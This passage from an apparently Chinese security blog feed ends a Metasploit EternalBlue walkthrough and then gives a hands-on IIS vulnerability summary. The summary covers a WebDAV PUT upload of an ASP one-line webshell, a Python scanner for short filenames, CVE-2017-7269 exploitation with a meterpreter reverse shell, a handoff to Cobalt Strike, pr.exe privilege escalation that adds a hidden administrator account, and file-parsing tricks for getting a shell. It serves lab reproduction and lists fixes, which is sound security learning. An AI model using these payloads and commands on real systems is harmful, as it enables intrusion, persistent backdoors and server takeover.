<p>Exploits 模块: show exploits</p>
<p><img src="/2020/03/01/MS17-010/4.gif" alt="clipboard.png"></p>
<p>rank表示好用级别：normal（正常），excellent（优秀），good（良好），average（平均）</p>
<p>命名规则:操作系统/服务/名称      windows/smb/ms17_010_eternalblue</p>
<h2 id="Payload-模块"><a href="#Payload-模块" class="headerlink" title="Payload 模块"></a>Payload 模块</h2><p>命名规则:操作系统/类型/名称<br>windows/x64/meterpreter/reverse_tcp<br>查看帮助内容:     help<br>显示模块信息: info windows/smb/ms17_010_eternalblue<br>显示所有的exploit模块: show exploits<br>根据名称搜索 :    search ms17_010</p>
<p><img src="/2020/03/01/MS17-010/5.gif" alt="clipboard.png"></p>
<p>联合搜索 :      </p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">search</span> <span class="type">name</span>:ms17 <span class="keyword">type</span>:exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/01/MS17-010/6.gif" alt="clipboard.png"></p>
<p>设置模块：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/01/MS17-010/7.gif" alt="clipboard.png"></p>
<p> options查看选项（查看需要设置什么）</p>
<p><img src="/2020/03/01/MS17-010/8.gif" alt="clipboard.png"></p>
<p>设置rhost（靶机ip）</p>
<p><img src="/2020/03/01/MS17-010/9.gif" alt="clipboard.png"></p>
<h2 id="查找使用的payload"><a href="#查找使用的payload" class="headerlink" title="查找使用的payload"></a>查找使用的payload</h2><p><img src="/2020/03/01/MS17-010/10.gif" alt="clipboard.png"></p>
<p>设置payload（tcp反向链接）</p>
<p><img src="/2020/03/01/MS17-010/11.gif" alt="clipboard.png"></p>
<p>option后设置本机ip</p>
<p><img src="/2020/03/01/MS17-010/12.gif" alt="clipboard.png"></p>
<p>然后运行 run  或者exploit</p>
<p><img src="/2020/03/01/MS17-010/13.gif" alt="clipboard.png"></p>
<h2 id="成功获取会话"><a href="#成功获取会话" class="headerlink" title="成功获取会话"></a>成功获取会话</h2><p>1：表示永恒之蓝覆盖成功完成</p>
<p><img src="/2020/03/01/MS17-010/14.gif" alt="clipboard.png"></p>
<p>2：目标主机和攻击机建立了了一个shell连接，会话为session 1</p>
<p><img src="/2020/03/01/MS17-010/15.gif" alt="clipboard.png"></p>
<p>3：得到一个meterpreter会话，尝试获取shell成功，靶机重启 </p>
<p><img src="/2020/03/01/MS17-010/16.gif" alt="clipboard.png"></p>
<p>4：在meterpreter会话下输入ps就能获得目标主机的当前进程</p>
<p><img src="/2020/03/01/MS17-010/17.gif" alt="clipboard.png"></p>
<p>命令：hosts</p>
<p>通过该命令我们可以添加主机以及删除主机等</p>
<p><img src="/2020/03/01/MS17-010/18.gif" alt="clipboard.png"></p>
<p>列出当前mac地址：hosts –c mac</p>
]]></content>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>IIS中间件漏洞总结</title>
    <url>/2020/07/14/iiszhong-jian-jian/</url>
    <content><![CDATA[<h1 id="IIS简介"><a href="#IIS简介" class="headerlink" title="IIS简介"></a>IIS简介</h1><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。<a id="more"></a></p>
<p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。 </p>
<p>IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据。</p>
<p>IIS 6.0：可解析后缀：.asa .cer .cdx .asp等脚本文件</p>
<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a><strong>漏洞产生原因</strong></h2><p> WEB服务器扩展里设置WebDAV为允许；网站权限配置开启了写入权限与脚本资源访问权限。</p>
<p><code>WebDAV(Web-based Distributed Authoring and Versioning)一种基于HTTP1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</code></p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h2><p>任意文件上传</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>实验环境使用windows server2003+iis6.0<br>环境下载链接：<a href="https://pan.baidu.com/s/1KOO7MkwIDpWAqbMMNSddzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1KOO7MkwIDpWAqbMMNSddzg</a> 提取码：5sia<br>开机密码123456</p>
<p>该靶机环境已经配置好了，其中WebDAV已经开启<br><img src="/2020/07/14/iiszhong-jian-jian/1594541644418.png" alt="1594541644418"></p>
<p>该靶机ip为192.168.102.62</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594541678355.png" alt="1594541678355"></p>
<p>使用nikto扫描一下该网址</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nikto -h http:<span class="comment">//192.168.102.62</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/iiszhong-jian-jian/1594541797109.png" alt="1594541797109"></p>
<p>该服务器支持PUT请求，并且允许客户端将文件保存在Web服务器上<br>通过burp进行抓包，将GET请求改为PUT，并且后面接上写入文件的名字，数据包最下面为写入文件的内容</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594542275421.png" alt="1594542275421"></p>
<p>写入成功<br><img src="/2020/07/14/iiszhong-jian-jian/1594542300535.png" alt="1594542300535"></p>
<p>写入一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"chopper"</span>)%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/iiszhong-jian-jian/1594544702817.png" alt="1594544702817"></p>
<p>使用MOVE或者COPY请求将其改为asp文件</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594544803770.png" alt="1594544803770"></p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594544836720.png" alt="1594544836720"></p>
<p>蚁剑连接即可获得shell</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594544991726.png" alt="1594544991726"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a><strong>修复方案</strong></h2><blockquote>
<p>关闭WebDAV服务<br>使用相关的防护设备</p>
</blockquote>
<h1 id="短文件名猜解漏洞"><a href="#短文件名猜解漏洞" class="headerlink" title="短文件名猜解漏洞"></a>短文件名猜解漏洞</h1><h2 id="漏洞产生原因-1"><a href="#漏洞产生原因-1" class="headerlink" title="漏洞产生原因"></a><strong>漏洞产生原因</strong></h2><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短 文件名，而生成的短文件名符合一定的规律，可以被暴力猜解。 </p>
<h2 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h2><ul>
<li><p>猜解后台地址 </p>
</li>
<li><p>猜解敏感文件，例如备份的rar、zip、.bak、.SQL文件等，在某些情形下，甚至可以通过短文件名web直接下 载对应的文件。比如下载备份SQL文件。 </p>
</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h2><p>这里需要用到通配符，在windows中，可以匹配n个字符，n可以为0。判断某站点是否存在IIS短文件名暴力破解漏 洞，可以分别访问如下两个URL: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/*~1*/a.aspx </span><br><span class="line"></span><br><span class="line">http://localhost/cyzcc*~1*/a.aspx</span><br></pre></td></tr></table></figure>

<p>短文件名特征：<br>只显示前<code>6</code>位的字符,后续字符用<code>~1</code>代替。其中数字<code>1</code>可以递增。如果存在文件名类似的文件,则前面的<code>6</code>个字符是相同的,后面的数字进行递增</p>
<p>如果访问第一个URL，返回404。而访问第二个URL，返回400。 则目标站点存在漏洞</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>复现需要添加组件APS.NET，方法如下：</p>
<ul>
<li>在运行 Windows Server 2003 的服务器中使用”添加或删除程序”安装 ASP.NET<br>  　　<br>  1）从”开始”菜单中，指向”控制面板”，然后单击”添加或删除程序”。<pre><code>　　2）在&quot;添加或删除程序&quot;对话框中，单击&quot;添加/删除 Windows 组件&quot;。
　　3）在&quot;Windows 组件&quot;向导中的&quot;组件&quot;中，选中&quot;应用程序服务器&quot;复选框，然后单击&quot;下一步&quot;。
　　4）当在&quot;Windows 组件&quot;向导中完成对 Windows Server 2003 的配置时，单击&quot;完成&quot;。</code></pre></li>
</ul>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594633978039.png" alt="1594633978039"></p>
<p>配置好之后我们可以使用命令<code>dir /x</code>来确定漏洞存在。如过存在短文件名，则确定漏洞存在</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594549873941.png" alt="1594549873941"></p>
<p>先在网站根目录下创建几个长文件名<br><img src="/2020/07/14/iiszhong-jian-jian/1594634713197.png" alt="1594634713197"></p>
<p>当访问一个存在的文件名时，浏览器返回404</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594634847699.png" alt="1594634847699"></p>
<p>当访问一个不存在的文件名时，浏览器返回400<br><img src="/2020/07/14/iiszhong-jian-jian/1594634900796.png" alt="1594634900796"></p>
<h2 id="自动化扫描"><a href="#自动化扫描" class="headerlink" title="自动化扫描"></a><strong>自动化扫描</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scanner</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target)</span>:</span></span><br><span class="line">        self.target = target.lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.target.startswith(<span class="string">'http'</span>):</span><br><span class="line">            self.target = <span class="string">'http://%s'</span> % self.target</span><br><span class="line">        self.scheme, self.netloc, self.path, params, query, fragment = \</span><br><span class="line">                     urlparse.urlparse(target)</span><br><span class="line">        <span class="keyword">if</span> self.path[<span class="number">-1</span>:] != <span class="string">'/'</span>:    <span class="comment"># ends with slash</span></span><br><span class="line">            self.path += <span class="string">'/'</span></span><br><span class="line">        self.alphanum = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-'</span></span><br><span class="line">        self.files = []</span><br><span class="line">        self.dirs = []</span><br><span class="line">        self.queue = Queue.Queue()</span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        self.threads = []</span><br><span class="line">        self.request_method = <span class="string">''</span></span><br><span class="line">        self.msg_queue = Queue.Queue()</span><br><span class="line">        self.STOP_ME = <span class="literal">False</span></span><br><span class="line">        threading.Thread(target=self._print).start()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_conn</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.scheme == <span class="string">'https'</span>:</span><br><span class="line">                conn = httplib.HTTPSConnection(self.netloc)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                conn = httplib.HTTPConnection(self.netloc)</span><br><span class="line">            <span class="keyword">return</span> conn</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[_conn.Exception]'</span>, e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_status</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = self._conn()</span><br><span class="line">            conn.request(self.request_method, path)</span><br><span class="line">            status = conn.getresponse().status</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> status</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'[_get_status.Exception] %s'</span> % str(e) )</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_vul</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> _method <span class="keyword">in</span> [<span class="string">'GET'</span>, <span class="string">'OPTIONS'</span>]:</span><br><span class="line">                self.request_method = _method</span><br><span class="line">                status_1 = self._get_status(self.path + <span class="string">'/*~1*/a.aspx'</span>)    <span class="comment"># an existed file/folder</span></span><br><span class="line">                status_2 = self._get_status(self.path + <span class="string">'/l1j1e*~1*/a.aspx'</span>)    <span class="comment"># not existed file/folder</span></span><br><span class="line">                <span class="keyword">if</span> status_1 == <span class="number">404</span> <span class="keyword">and</span> status_2 != <span class="number">404</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'[is_vul.Exception] %s'</span> % str(e) )</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.alphanum:</span><br><span class="line">            self.queue.put( (self.path + c, <span class="string">'.*'</span>) )    <span class="comment"># filename, extension</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            t = threading.Thread(target=self._scan_worker)</span><br><span class="line">            self.threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> self.threads:</span><br><span class="line">            t.join()</span><br><span class="line">        self.STOP_ME = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">report</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span>* <span class="number">64</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> self.dirs:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Dir:  %s'</span> % d</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> self.files:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'File: %s'</span> % f</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span>*<span class="number">64</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%d Directories, %d Files found in total'</span> % (len(self.dirs), len(self.files))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Note that * is a wildcard, matches any character zero or more times.'</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_print</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.STOP_ME <span class="keyword">or</span> (<span class="keyword">not</span> self.msg_queue.empty()):</span><br><span class="line">            <span class="keyword">if</span> self.msg_queue.empty():</span><br><span class="line">                time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> self.msg_queue.get()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_scan_worker</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url, ext = self.queue.get(timeout=<span class="number">1.0</span>)</span><br><span class="line">                status = self._get_status(url + <span class="string">'*~1'</span> + ext + <span class="string">'/1.aspx'</span>)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="number">404</span>:</span><br><span class="line">                    self.msg_queue.put(<span class="string">'[+] %s~1%s\t[scan in progress]'</span> % (url, ext))</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> len(url) - len(self.path)&lt; <span class="number">6</span>:    <span class="comment"># enum first 6 chars only</span></span><br><span class="line">                        <span class="keyword">for</span> c <span class="keyword">in</span> self.alphanum:</span><br><span class="line">                            self.queue.put( (url + c, ext) )</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> ext == <span class="string">'.*'</span>:</span><br><span class="line">                            self.queue.put( (url, <span class="string">''</span>) )</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">if</span> ext == <span class="string">''</span>:</span><br><span class="line">                            self.dirs.append(url + <span class="string">'~1'</span>)</span><br><span class="line">                            self.msg_queue.put(<span class="string">'[+] Directory '</span> +  url + <span class="string">'~1\t[Done]'</span>)</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">elif</span> len(ext) == <span class="number">5</span> <span class="keyword">or</span> (<span class="keyword">not</span> ext.endswith(<span class="string">'*'</span>)):    <span class="comment"># .asp*</span></span><br><span class="line">                            self.files.append(url + <span class="string">'~1'</span> + ext)</span><br><span class="line">                            self.msg_queue.put(<span class="string">'[+] File '</span> + url + <span class="string">'~1'</span> + ext + <span class="string">'\t[Done]'</span>)</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class="line">                                self.queue.put( (url, ext[:<span class="number">-1</span>] + c + <span class="string">'*'</span>) )</span><br><span class="line">                                <span class="keyword">if</span> len(ext) &lt; <span class="number">4</span>:    <span class="comment"># &lt; len('.as*')</span></span><br><span class="line">                                    self.queue.put( (url, ext[:<span class="number">-1</span>] + c) )</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">except</span> Queue.Empty,e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[Exception]'</span>, e</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: python IIS_shortname_Scan.py http://www.target.com/'</span></span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    s = Scanner(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.is_vul():</span><br><span class="line">        s.STOP_ME = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server is not vulnerable'</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Server is vulnerable, please wait, scanning...'</span></span><br><span class="line">    s.run()</span><br><span class="line">    s.report()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/iiszhong-jian-jian/1594635025860.png" alt="1594635025860"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h2><ul>
<li><p>升级.net framework </p>
</li>
<li><p>修改注册表键值： </p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem </p>
<p>修改NtfsDisable8dot3NameCreation为1。再新建文件夹，将原网站目录内容拷贝进入新建的文件夹，使用 新建的文件夹作为网站目录。 </p>
</li>
</ul>
<h1 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a><strong>产生原因</strong></h2><p>当IIS6.0 开启了WebDav协议（开启PROPFIND协议）时存在此漏洞，缓冲区溢出导致远程命令执行。 </p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><strong>漏洞检测</strong></h2><p>基于版本，windowsserver2003 R2+iis6.0+开启PROPFIND协议的服务器存在此漏洞。 </p>
<h2 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h2><p>可以获取服务器shell </p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>靶机环境：windows server2003+iis6.0 </p>
<p>下载exp: git clone <a href="https://github.com/Al1ex/CVE-2017-7269" target="_blank" rel="noopener">https://github.com/Al1ex/CVE-2017-7269</a> </p>
<p>复制cve-2017-7269.rb到相应的目录下面： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cp cve_2017_7269.rb  /usr/share/metasploit-framework/modules/exploits/windows/iis/cve_2017_7269.rb</span><br><span class="line"><span class="comment">#这里需要将cve-2017-7269.rb改为cve_2017_7269.rb，否则会报错</span></span><br></pre></td></tr></table></figure>

<p>msf更新后自带exploit/windows/iis/iis_webdav_scstoragepathfromurl模块，但是试了很久都没有成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use  exploits/windows/iis/cve_2017_7269</span><br><span class="line">set httphost 192.168.102.137</span><br><span class="line">set rhosts 192.168.102.137</span><br><span class="line">set physicalpathlength 19</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.102.128</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>其中physicalpathlength为网站路径，默认为19，也可通过爆破来得到长度<br>参考文章：<a href="https://xz.aliyun.com/t/6485#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/6485#toc-9</a></p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594644318564.png" alt="1594644318564"></p>
<p>成功获得shell<br><img src="/2020/07/14/iiszhong-jian-jian/1594644338992.png" alt="1594644338992"></p>
<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h2><blockquote>
<p>关闭WebDAV服务<br>使用相应的防护软件<br>升级操作系统 </p>
</blockquote>
<h1 id="本地提权漏洞"><a href="#本地提权漏洞" class="headerlink" title="本地提权漏洞"></a>本地提权漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>IIS 6.0默认不开启WebDAV,一旦开启了WebDAV,安装了IIS6.0的服务器将可能受到该漏洞的威胁。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h2><p>Windows 2003 R2开启WebDAV服务的IIS6.0</p>
<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>使用上面获得的shell，查看当前用户权限<br><img src="/2020/07/14/iiszhong-jian-jian/1594715818472.png" alt="1594715818472"></p>
<p>在根目录创建一个文件夹用来放提权相关文件，之后在meterpreter上传pr.exe</p>
<p>其下载地址 为：<a href="https://github.com/klsfct/getshell/blob/master/MS09-012/pr.exe" target="_blank" rel="noopener">https://github.com/klsfct/getshell/blob/master/MS09-012/pr.exe</a><br>开始下载错了，卡了很久</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594716059053.png" alt="1594716059053"></p>
<p>在msf里面执行命令会产生乱码，这里将msf权限派生到cobaltstrike<br>使用msf中的 exploit/windows/local/payload_inject模块</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">payload_inject</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_http</span></span><br><span class="line"><span class="title">set</span> <span class="title">DisablePayloadHandler</span> <span class="title">true</span>   #默认情况下，<span class="title">payload_inject</span>执行之后会在本地产生一个新的<span class="title">handler</span>，由于已经有了一个不需要再产生一个，所以这里设置为<span class="title">true</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> <span class="title">xxxx</span>                   #<span class="title">cobaltstrike</span>监听的<span class="title">ip</span></span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> <span class="title">xxxx</span>                  #<span class="title">cobaltstrike</span>监听的端口 </span><br><span class="line"><span class="title">set</span> <span class="title">session</span> 1                    #这里是当前获得的<span class="title">session</span>的<span class="title">id</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/iiszhong-jian-jian/1594716873116.png" alt="1594716873116"></p>
<p>上线之后发现可以直接使用ms14-058进行提取<br><img src="/2020/07/14/iiszhong-jian-jian/1594717065348.png" alt="1594717065348"></p>
<p><code>------------------------------------</code></p>
<p>上传完成后执行<code>pr.exe whoami</code>即可得到一个system权限</p>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594725567419.png" alt="1594725567419"></p>
<p>执行<code>net user admin admin /add</code>创建用户显示拒绝访问<br>执行<code>pr.exe &quot;net user admin admin /add&quot;</code>创建成功<br><img src="/2020/07/14/iiszhong-jian-jian/1594729147261.png" alt="1594729147261"></p>
<p>之后将新创建的用户添加到管理员组</p>
<blockquote>
<p><code>pr.exe &quot;net localgroup administrators admin /add&quot;</code></p>
</blockquote>
<p><img src="/2020/07/14/iiszhong-jian-jian/1594729185270.png" alt="1594729185270"></p>
<p>查看Administrator组用户<code>net localgroup Administrators</code><br><img src="/2020/07/14/iiszhong-jian-jian/1594729252421.png" alt="1594729252421"></p>
<p>这个靶机开放了3389端口，可以直接远程桌面连接<br><img src="/2020/07/14/iiszhong-jian-jian/1594729890670.png" alt="1594729890670"></p>
<p>如果未开放3389端口，可以上传一个3389.bat即可</p>
<p><strong>漏洞修复</strong></p>
<blockquote>
<p>关闭WebDAV服务 </p>
<p>使用相应的防护软件 </p>
<p>升级操作系统 </p>
</blockquote>
<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a><strong>IIS 6.x</strong></h2><p><strong>产生原因：</strong>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞； </p>
<p><strong>漏洞利用：</strong></p>
<ul>
<li><p>新建一个名为“test.asp”的目录，该目录下的任何文件都作为asp程序执行（特殊符号是”/“) </p>
</li>
<li><p>上传名为“test.asp;.jpg”的文件，虽然该文件真正的后缀名是”.jpg”,但由于含有特殊符号“;”，仍然会被IIS作为 asp程序执行。 </p>
</li>
</ul>
<p><strong>产生影响：</strong>该解析漏洞可以使得入侵者绕过服务端的检测，进而getshell。 </p>
<p><strong>漏洞修复：</strong> </p>
<blockquote>
<p>做好权限设置,限制用户创建文件夹。<br>可以通过自己编写正则,阻止上传 xx.asp;.jpg等类型的文件名<br>安装相应的防护软件</p>
</blockquote>
<h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a><strong>IIS 7.0/7.5</strong></h2><p>IIS 7.0/7.5：可解析后缀：.asa .cer .cdx .asp等脚本文件 </p>
<p><strong>产生原因：</strong>由于php配置文件中，默认开启了cgi.fifix_pathinfo=1，PHP CGI会以 / 为分隔符号从后向前依次检查， 直到找到某个存在的文件，便把该文件作为php程序执行。 </p>
<p><strong>利用方式：</strong></p>
<ul>
<li><p>上传图片木马test.jpg后直接访问*/test.jpg/.php，以php的方式解析执行。 </p>
</li>
<li><p>在shell.jpg的文件中写入php代码(当执行该文件的时候自动创建一个shell.php的一句话木马)，然后直 </p>
</li>
</ul>
<p>接访问*/shell.jpg/.php，以php的方式解析运行，此时shell.php就会被创建。可getshell。 </p>
<p><strong>漏洞危害：</strong>该解析漏洞可以使得入侵者绕过服务端的检测，进而getshell。 </p>
<p><strong>漏洞修复：</strong> </p>
<blockquote>
<p>关闭cgi.fifix_pathinfo，令cgi.fifix_pathinfo为0; </p>
<p>图片上传目录不给执行权限； </p>
<p>升级php-fpm、nginx; </p>
<p>安装相应的防护软件</p>
</blockquote>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.ghtwf01.cn/index.php/archives/377/#menu_index_8" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/377/#menu_index_8</a></p>
<p><a href="https://blog.csdn.net/Fly_hps/article/details/80305512" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80305512</a></p>
]]></content>
      <tags>
